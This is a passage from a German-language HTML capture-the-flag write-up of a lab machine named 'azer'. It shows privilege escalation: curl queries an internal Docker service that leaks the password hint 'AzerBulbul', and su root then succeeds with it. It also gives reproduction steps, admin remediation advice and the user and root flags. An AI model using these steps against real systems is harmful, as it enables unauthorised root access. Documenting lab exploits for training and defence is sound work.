+ 4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default
+     link/ether 02:42:08:46:4a:85 brd ff:ff:ff:ff:ff:ff
+     inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+        valid_lft forever preferred_lft forever
+ 6: veth10ba7b8@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-333bcb432cd5 state UP group default
+     link/ether 7a:4e:d5:3c:3d:cd brd ff:ff:ff:ff:ff:ff link-netnsid 0
+     inet6 fe80::784e:d5ff:fe3c:3dcd/64 scope link
+        valid_lft forever preferred_lft forever
+                      </pre> <!-- Maskierung < > -->
+                  </div>
+              </div>
+         </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (Password Guessing via Internal Service)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf der Entdeckung des Docker-Netzwerks `10.10.10.0/24` wird versucht, eine IP innerhalb dieses Bereichs (`10.10.10.10` - wahrscheinlich durch Scannen oder Raten gefunden) mit `curl` auf Port 80 (Standard-HTTP) zu erreichen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der `curl`-Befehl ist erfolgreich und erhält die Antwort `.:.AzerBulbul.:.`. Dies bestätigt einen Webdienst auf einem internen Container unter `10.10.10.10`. Der Name "Azer Bulbul" (ein türkischer Sänger) ist ein starker Hinweis auf ein mögliches Passwort.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche das Passwort `AzerBulbul` für den `root`-Benutzer mittels `su root`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie interne Containerdienste ab. Verwenden Sie keine Namen oder leicht zu erratende Hinweise als Passwörter. Beschränken Sie den Netzwerkzugriff auf Container.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ azer@azer:~/.npm$ <span class="command">curl http://10.10.10.10</span>
+                     </div>
+                     <pre>
+ .:.AzerBulbul.:.
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, mit `su root` zum Root-Benutzer zu wechseln. Als Passwort wird `AzerBulbul` (aus dem internen Dienst abgeleitet) eingegeben.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Privilege Escalation erfolgreich!** Das Passwort `AzerBulbul` ist korrekt. Der Wechsel zum `root`-Benutzer gelingt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt. Lese die Root-Flag (`/root/root.txt`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Root-Passwort sofort ändern!** Untersuchen Sie, wie der interne Dienst auf 10.10.10.10 das Passwort preisgeben konnte. Sichern Sie interne Dienste und verwenden Sie starke, einzigartige Passwörter für alle Konten, insbesondere `root`.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: yellow;">
+ azer@azer:~/.npm$ <span class="command">su root</span>
+                     </div>
+                     <pre>
+ Password: <span class="command">AzerBulbul</span>
+ root@azer:/home/azer/.npm#
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Als `root` wird ins Home-Verzeichnis gewechselt und die Datei `root.txt` ausgelesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Root-Flag `<span class="password">b5d96aec2d5f1541c5e7910ccab527d8</span>` wird erfolgreich gelesen. Die Maschine ist vollständig kompromittiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bericht abschließen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> System bereinigen, Passwörter ändern, Schwachstellen (Command Injection, unsicheres Root-Passwort, interner Dienst) beheben.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">
+ root@azer:/home/azer/.npm# <span class="command">cd ~</span>
+                     </div>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">
+ root@azer:~# <span class="command">ls</span>
+                     </div>
+                     <pre>
+ root.txt
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt" style="color: red;">
+ root@azer:~# <span class="command">cat root.txt</span>
+                     </div>
+                     <pre>
+ <span class="password">b5d96aec2d5f1541c5e7910ccab527d8</span>
+                     </pre>
+                 </div>
+             </div>
+         </section>
+
+        <section id="poc-privesc">
+             <h2>Proof of Concept (Privilege Escalation - Password Guessing)</h2>
+              <p class="analysis">
+                 <strong>Analyse:</strong> Dieser POC beschreibt die Erlangung von Root-Rechten durch das Erraten des Root-Passworts basierend auf einem Hinweis von einem internen Dienst im Docker-Netzwerk.
+              </p>
+              <p>
+                 <strong>Schwachstelle:</strong> Ein schwaches, aus einem Hinweis ableitbares Root-Passwort. Ein interner Dienst (`http://10.10.10.10`) gibt diesen Hinweis preis.
+              </p>
+              <p>
+                 <strong>Voraussetzungen:</strong> Shell-Zugriff als nicht-privilegierter Benutzer (`azer`), der Zugriff auf das interne Docker-Netzwerk (`10.10.10.0/24`) hat. Fähigkeit, den internen Dienst auf `10.10.10.10` zu erreichen.
+              </p>
+              <p>
+                 <strong>Schritte zur Reproduktion:</strong>
+                 <ol>
+                     <li>Erlange eine Shell als Benutzer `azer` (z.B. via Command Injection auf Port 3000).</li>
+                     <li>Identifiziere das interne Docker-Netzwerk (z.B. mit `ip a`).</li>
+                     <li>Scanne oder rate IPs im internen Netz, um den Dienst auf `10.10.10.10` zu finden.</li>
+                     <li>Frage den Dienst ab: `curl http://10.10.10.10`.</li>
+                     <li>Notiere die Antwort: `.:.AzerBulbul.:.`.</li>
+                     <li>Versuche, zum Root-Benutzer zu wechseln und verwende `AzerBulbul` als Passwort: `su root`.</li>
+                 </ol>
+              </p>
+              <p>
+                 <strong>Erwartetes Ergebnis:</strong> Der `su`-Befehl ist erfolgreich und gewährt eine Root-Shell.
+              </p>
+               <p class="recommendation">
+                  <strong>Empfehlung (Admin):</strong> Verwenden Sie starke, zufällige und einzigartige Passwörter für alle Konten, insbesondere für `root`. Speichern oder enthüllen Sie keine Passwörter oder Hinweise darauf in internen oder externen Diensten. Sichern Sie interne Dienste angemessen ab. Beschränken Sie den `su`-Zugriff.
+              </p>
+          </section>
+
+         <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                  <div class="flag-entry">
+                     <div class="flag-command">cat /home/azer/user.txt</div>
+                     <div class="flag-value"><span class="password">0d2856d69dc348b3af80a0eed67c7502</span></div>
+                 </div>
+
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">b5d96aec2d5f1541c5e7910ccab527d8</span></div>
+                 </div>
+             </div>
+         </section> 
+
+     <footer class="footer">
+         <p>DarkSpirit - Cyber Security Reports</p>
+         <p>Berichtsdatum: 2024-04-30</p> <!-- Datum aus Scans -->
+     </footer>
+ </body>
+ </html>
